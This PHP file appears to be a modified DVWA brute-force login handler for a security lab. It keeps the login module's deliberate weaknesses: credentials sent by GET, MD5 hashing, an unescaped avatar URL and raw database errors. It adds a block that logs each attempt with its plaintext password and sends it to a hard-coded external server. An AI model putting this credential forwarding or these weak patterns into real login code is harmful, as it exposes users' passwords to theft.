<?php

if( isset( $_GET[ 'Login' ] ) ) {

    // 🔥 기본값
    $result_status = "fail";

    // 입력값
    $user = $_GET[ 'username' ];
    $user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user);

    $raw_pass = $_GET[ 'password' ];
    $raw_pass = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $raw_pass);
    $pass = md5($raw_pass);

    // DB 조회
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query)
        or die('<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>');

    // 로그인 결과
    if( $result && mysqli_num_rows( $result ) == 1 ) {

        $result_status = "success";

        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        $html .= "<p>Welcome to the password protected area {$user}</p>";
        $html .= "<img src=\"{$avatar}\" />";
    }
    else {
        sleep(2); // 🔥 Medium 특징
        $html .= "<pre><br />Username and/or password incorrect.</pre>";
    }

    // =========================
    // 🔥 여기부터 추가 (Low랑 동일)
    // =========================

    // 클라이언트 IP
    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['REMOTE_ADDR']
        ?? "";

    // 로그 데이터
    $data = [
        "timestamp" => microtime(true),
        "ip" => $client_ip,
        "username" => $user,
        "password" => $raw_pass,
        "result" => $result_status,
        "user_agent" => $_SERVER['HTTP_USER_AGENT'] ?? "",
        "language" => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? "",
        "method" => $_SERVER['REQUEST_METHOD'] ?? ""
    ];

    // 로컬 저장
    file_put_contents("/tmp/dvwa_log.json", json_encode($data) . "\n", FILE_APPEND);

    // FastAPI 전송
    $url = "http://3.36.67.236:8000/login";

    $headers = [
        "Content-type: application/json",
        "X-Forwarded-For: " . $client_ip,
        "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? "")
    ];

    $options = [
        'http' => [
            'header'  => implode("\r\n", $headers) . "\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'timeout' => 2
        ]
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);

    // DB 종료
    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
